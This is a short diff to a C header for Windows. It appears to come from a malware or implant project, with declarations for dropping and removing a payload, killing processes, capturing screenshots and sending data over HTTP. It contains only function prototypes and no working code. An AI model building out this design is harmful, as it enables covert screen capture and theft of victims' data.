@@ -37,6 +37,7 @@ BOOL ReadLocalFile( OUT PVOID* pFileBuff, OUT DWORD* pdwSize );
 
 BOOL WritePayloadToTemp( IN LPCWSTR TempDirectory );
 
+
 /* ---------------------------------------------------------------------------------------------------------------------------------------- */
 // uninstall functions
 
@@ -50,5 +51,14 @@ BOOL RemovePayloadFromDisk();
 BOOL TerminateRunningProcess( IN DWORD dwPid );
 
 BOOL CheckProcesses( IN LPCWSTR lpProcessName, OUT DWORD* dwPid );
+
+PVOID CopyMemoryEx( _Inout_ PVOID Destination, _In_ PVOID Source, _In_ SIZE_T Length );
+
+/* ---------------------------------------------------------------------------------------------------------------------------------------- */
+
+BOOL ScreenshotBmp(
+	_Out_ PVOID* Buffer,
+	_Out_ PULONG Length
+);
 
 BOOL SendOverHttp( IN PVOID pAddress, IN DWORD size );
